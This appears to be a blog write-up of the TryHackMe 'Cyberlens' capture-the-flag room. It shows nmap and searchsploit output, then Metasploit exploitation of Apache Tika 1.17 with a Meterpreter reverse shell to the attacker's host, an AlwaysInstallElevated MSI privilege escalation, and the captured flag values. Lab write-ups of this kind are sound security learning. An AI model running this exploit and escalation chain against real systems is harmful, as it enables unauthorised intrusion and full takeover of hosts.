<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyberlens | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 0;
            background: #22c55e;
            color: #000;
            font-size: 0.6rem;
            font-weight: bold;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
        }
        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
        .markdown-content p { margin-bottom: 1.5rem; }
        
        .diag-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            position: relative;
            overflow: hidden;
        }
        .diag-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            height: 100%;
            background: #22c55e;
            opacity: 0.5;
        }
        .diag-label {
            display: block;
            font-size: 0.6rem;
            text-transform: uppercase;
            color: #64748b;
            margin-bottom: 0.25rem;
            letter-spacing: 0.1em;
        }
        .diag-value {
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .diag-blink {
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">

    <!-- Navigation -->
    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <a href="../index.html" class="logo-container group flex items-center gap-3">
                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
            </a>

            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
        <!-- Post Header -->
        <header class="mb-12 border-b border-slate-800 pb-12">
            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
                <span>// 2024-12-30</span>
                <span>// ID: REF-Cyberlens</span>
            </div>
            
            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Cyberlens</h1>
            
            <div class="flex flex-wrap gap-2">
                <!-- Tags populated by python -->
                <!-- tryhackme, ctf -->
            </div>
        </header>

        <!-- Markdown Body -->
        <div class="markdown-content">
            <hr />
<blockquote>
<p>target - 10.201.116.26<br />
Things to Note</p>
</blockquote>
<ol>
<li>Be sure to add the IP to your /etc/hosts file: <code>sudo echo '10.201.116.26 cyberlens.thm' &gt;&gt; /etc/hosts</code></li>
<li>Make sure you wait 5 minutes before starting so the VM fully starts each service</li>
</ol>
<blockquote>
<p>Found somethink run on 61777 port wia website  source cord</p>
</blockquote>
<pre class="codehilite"><code>fetch(&quot;http://cyberlens.thm:61777/meta&quot;, {
            method: &quot;PUT&quot;,
            body: fileData,
            headers: {
              &quot;Accept&quot;: &quot;application/json&quot;,
              &quot;Content-Type&quot;: &quot;application/octet-stream&quot;
            }
</code></pre>

<blockquote>
<p>So check that port wia nmap and found tika apache vaulnerbility</p>
</blockquote>
<pre class="codehilite"><code>❯ nmap cyber.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:32 EDT
Nmap scan report for cyber.thm (10.201.116.26)
Host is up (0.36s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
❯ nmap cyber.thm -p80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:39 EDT
Nmap scan report for cyber.thm (10.201.116.26)
Host is up (0.35s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
❯ nmap -p 61777 -sC -sV cyber.thm -Pn -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 08:42 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Initiating SYN Stealth Scan at 08:42
Scanning cyber.thm (10.201.116.26) [1 port]
Discovered open port 61777/tcp on 10.201.116.26
Completed SYN Stealth Scan at 08:42, 0.37s elapsed (1 total ports)
Initiating Service scan at 08:42
Scanning 1 service on cyber.thm (10.201.116.26)
Completed Service scan at 08:42, 12.38s elapsed (1 service on 1 host)
NSE: Script scanning 10.201.116.26.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 7.80s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 1.67s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.01s elapsed
Nmap scan report for cyber.thm (10.201.116.26)
Host is up, received user-set (0.34s latency).
Scanned at 2025-10-09 08:42:26 EDT for 22s

PORT      STATE SERVICE REASON          VERSION
61777/tcp open  http    syn-ack ttl 125 Jetty 8.y.z-SNAPSHOT
|_http-cors: HEAD GET
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-title: Welcome to the Apache Tika 1.17 Server
| http-methods: 
|   Supported Methods: POST GET PUT OPTIONS HEAD
|_  Potentially risky methods: PUT

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:42
Completed NSE at 08:42, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
</code></pre>

<blockquote>
<p>So Use searchploit and found this</p>
</blockquote>
<pre class="codehilite"><code>❯ searchsploit Apache Tika
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                                                          | windows/remote/47208.rb
Apache Tika-server &lt; 1.18 - Command Injection                                                                            | windows/remote/46540.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>

<blockquote>
<p>So use msfconsole</p>
</blockquote>
<pre class="codehilite"><code>msf exploit(windows/http/apache_tika_jp2_jscript) &gt; options

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, so
                                         cks5h
   RHOSTS     cyber.thm        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      61777            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to liste
                                       n on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.16.42      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.
msf exploit(windows/http/apache_tika_jp2_jscript) &gt; exploit
</code></pre>

<blockquote>
<p>and get reverseshell connection</p>
</blockquote>
<pre class="codehilite"><code>meterpreter &gt; 
meterpreter &gt; pwd
C:\Windows\system32

meterpreter &gt; cd ../../users
meterpreter &gt; pwd
C:\users
meterpreter &gt; ls
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2025-10-09 08:41:58 -0400  Administrator
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  All Users
040777/rwxrwxrwx  8192  dir   2023-11-25 02:31:22 -0500  CyberLens
040555/r-xr-xr-x  8192  dir   2021-03-17 10:58:07 -0400  Default
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Default User
040555/r-xr-xr-x  4096  dir   2018-12-12 02:45:15 -0500  Public
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini

meterpreter &gt; cd CyberLens
meterpreter &gt; ls
Listing: C:\users\CyberLens

meterpreter &gt; cd Desktop
meterpreter &gt; ls
Listing: C:\users\CyberLens\Desktop
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  282   fil   2023-06-06 15:48:33 -0400  desktop.ini
100666/rw-rw-rw-  25    fil   2023-06-06 15:54:19 -0400  user.txt

meterpreter &gt; cat user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
meterpreter &gt; 
</code></pre>

<blockquote>
<p>To find admin.txt also use msfconsole but use another payload and module</p>
</blockquote>
<pre class="codehilite"><code>msf &gt; search use multi/recon/local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf &gt; search /windows/local/always_install_elevated

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/windows/local/always_install_elevated  2010-03-18       excellent  Yes    Windows AlwaysInstallElevated MSI


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/always_install_elevated

msf &gt; 
</code></pre>

<blockquote>
<p>So use this</p>
</blockquote>
<pre class="codehilite"><code>meterpreter &gt; background
[*] Backgrounding session 1...
msf exploit(windows/http/apache_tika_jp2_jscript) &gt; 
msf exploit(windows/http/apache_tika_jp2_jscript) &gt; use multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/always_install_elevated) &gt; set SESSION 1
SESSION =&gt; 1
msf exploit(windows/local/always_install_elevated) &gt; exploit
[*] Started reverse TCP handler on 10.21.16.42:4444 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\NcivPhvsVr.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.201.116.26
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\NcivPhvsVr.msi
[*] Meterpreter session 2 opened (10.21.16.42:4444 -&gt; 10.201.116.26:49941) at 2025-10-09 09:27:52 -0400

meterpreter &gt; pwd
C:\Windows\system32


meterpreter &gt; cd ../../
meterpreter &gt; pwd
C:\
meterpreter &gt; cd users
meterpreter &gt; pwd
C:\users
meterpreter &gt; ls
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2025-10-09 08:41:58 -0400  Administrator
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  All Users
040777/rwxrwxrwx  8192  dir   2023-11-25 02:31:22 -0500  CyberLens
040555/r-xr-xr-x  8192  dir   2021-03-17 10:58:07 -0400  Default
040777/rwxrwxrwx  0     dir   2018-09-15 03:28:48 -0400  Default User
040555/r-xr-xr-x  4096  dir   2018-12-12 02:45:15 -0500  Public
100666/rw-rw-rw-  174   fil   2018-09-15 03:16:48 -0400  desktop.ini

meterpreter &gt; cd Administrator

meterpreter &gt; cd Desktop
meterpreter &gt; ls
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  527   fil   2016-06-21 11:36:17 -0400  EC2 Feedback.website
100666/rw-rw-rw-  554   fil   2016-06-21 11:36:23 -0400  EC2 Microsoft Windows Guide.website
100666/rw-rw-rw-  24    fil   2023-11-27 14:50:45 -0500  admin.txt
100666/rw-rw-rw-  282   fil   2021-03-17 11:13:27 -0400  desktop.ini

meterpreter &gt; cat admin.txt
THM{3lev@t3D-4-pr1v35c!}
meterpreter &gt;
</code></pre>

<h1><code>exploit/windows/http/apache_tika_jp2_jscript</code> — <em>remote exploit / initial access</em></h1>
<p><strong>Goal:</strong> get a remote shell (a Meterpreter session) on the target by abusing an Apache Tika server.</p>
<p><strong>What it does (high level):</strong></p>
<ul>
<li>
<p>The module targets a specific vulnerability in Apache Tika that allows the attacker to send specially crafted HTTP requests (usually PUT to <code>/meta</code>) that cause the server to interpret attacker-supplied data as script/commands.</p>
</li>
<li>
<p>Metasploit’s module sends a small <em>command stager</em> (chunks of a payload) via HTTP requests that the server writes/executes.</p>
</li>
<li>
<p>The stager arranges for the target to download and run a larger payload (the Meterpreter <em>stage</em>). Once the stage runs, you get an interactive Meterpreter session back to your listener (LHOST:LPORT).</p>
</li>
</ul>
<p><strong>What happens on the network / target:</strong></p>
<ul>
<li>
<p>Your msfconsole opens a listener on your machine.</p>
</li>
<li>
<p>The exploit sends multiple HTTP PUT requests to the target (e.g. <code>PUT /meta</code>) carrying parts of the stager.</p>
</li>
<li>
<p>The target processes those requests, ends up executing the stager (because of the vulnerability), which then downloads/executes the Meterpreter payload.</p>
</li>
<li>
<p>After the stage runs, a TCP connection is made back to your machine and <code>Meterpreter session X opened</code> appears.</p>
</li>
</ul>
<p><strong>What Meterpreter gives you:</strong></p>
<ul>
<li>
<p>An interactive agent with many built-in commands: <code>sysinfo</code>, <code>getuid</code>, <code>ls</code>, <code>cat</code>, <code>upload</code>, <code>download</code>, <code>shell</code> (drops into cmd.exe), and helpers for post-exploitation.</p>
</li>
<li>
<p>This is typically a <strong>low-privilege</strong> account (not SYSTEM/Administrator) unless the exploit already gave higher privileges.</p>
</li>
</ul>
<hr />
<h1><code>multi/recon/local_exploit_suggester</code> — <em>post-exploit reconnaissance</em></h1>
<p><strong>Goal:</strong> with an existing session, scan the target’s environment and recommend <em>local</em> Metasploit modules that are likely to escalate privileges.</p>
<p><strong>What it does (high level):</strong></p>
<ul>
<li>
<p>It <strong>does not exploit</strong> anything. Instead, it enumerates the host (via your session) and runs the <code>check</code> routine of many local exploit modules that exist in your Metasploit installation.</p>
</li>
<li>
<p>Each local exploit module usually implements a <code>check</code> method that inspects the system (kernel version, installed patches, registry values, services, SUID bits, file permissions, etc.) and returns whether the vulnerability <em>looks</em> exploitable.</p>
</li>
<li>
<p>The suggester aggregates the checks and prints a list of candidate local exploits (with indications like “appears vulnerable”, “failed check”, or error).</p>
</li>
</ul>
<p><strong>What happens on the victim:</strong></p>
<ul>
<li>
<p>The suggester calls Meterpreter commands or runs lightweight probes on the target to collect info (OS, architecture, patch level, registry keys, installed programs).</p>
</li>
<li>
<p>For each local exploit it runs the exploit module’s <code>check</code> (which usually reads files/registry or runs harmless commands). This is mostly read/enum activity — not destructive.</p>
</li>
</ul>
<p><strong>Why run it:</strong></p>
<ul>
<li>
<p>Saves time and reduces trial-and-error. Rather than blindly trying many LPEs that might crash or do nothing, the suggester narrows down plausible candidates.</p>
</li>
<li>
<p>Still requires manual verification: <code>check</code> can give false positives/negatives. You should <code>use</code> the suggested exploit and run <code>check</code>/inspect code/options before running <code>exploit</code>.</p>
</li>
</ul>
<hr />
<h1><code>exploit/windows/local/always_install_elevated</code> — <em>local privilege escalation (LPE)</em></h1>
<p><strong>Goal:</strong> escalate from a normal user to SYSTEM/Administrator on Windows when the machine has a specific misconfiguration.</p>
<p><strong>What it targets:</strong> the Windows Group Policy setting <strong>AlwaysInstallElevated</strong> (when set to <code>1</code> in either HKCU or HKLM), which makes MSI package installations run with SYSTEM privileges.</p>
<p><strong>What it does (high level):</strong></p>
<ul>
<li>The module creates a <strong>malicious MSI installer</strong> that contains payload code (a Meterpreter or other payload).</li>
<li>It transfers the MSI to the target (via the existing session), then calls <code>msiexec</code> or otherwise triggers Windows Installer to install that MSI.</li>
<li>Because the policy is enabled, Windows installs the MSI with <strong>SYSTEM</strong> privileges—so the payload inside the MSI runs as SYSTEM.</li>
<li>The module sets up a new payload/listener and you receive a new Meterpreter session running as SYSTEM (higher privileged session).</li>
</ul>
<p><strong>What happens on the victim:</strong></p>
<ul>
<li>The exploit writes an MSI file somewhere on disk.</li>
<li>The exploit executes the MSI using standard Windows installer mechanisms (like <code>msiexec</code>).</li>
<li>Windows Installer runs the MSI code as SYSTEM due to the policy; the payload runs and opens a privileged callback to your listener.</li>
<li>You get a second session (or replace the session) that has SYSTEM/Administrator privileges.</li>
</ul>
<p><strong>Important note:</strong> this <strong>only works</strong> if <code>AlwaysInstallElevated</code> is enabled (checked via registry). If not enabled, the MSI will run with the user’s privilege and the exploit fails.</p>
<hr />
<ol>
<li>
<p><strong>Find a remote vulnerability</strong> (Apache Tika) → use <code>exploit/windows/http/apache_tika_jp2_jscript</code>.<br />
    Result: you get a Meterpreter session (initial foothold).</p>
</li>
<li>
<p><strong>Enumerate for escalation options</strong> → run <code>multi/recon/local_exploit_suggester</code> against that session.<br />
    Result: a shortlist of local exploits that look promising (e.g., AlwaysInstallElevated flagged).</p>
</li>
<li>
<p><strong>Use the chosen local exploit</strong> → <code>use exploit/windows/local/always_install_elevated</code>; <code>set SESSION &lt;id&gt;</code>; <code>exploit</code>.<br />
    Result: the module builds and runs an MSI installer on target and (if successful) gives you a SYSTEM session. Then you <code>cd</code> into <code>C:\Users\Administrator\Desktop</code> and <code>cat admin.txt</code> — admin flag acquired.</p>
</li>
</ol>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>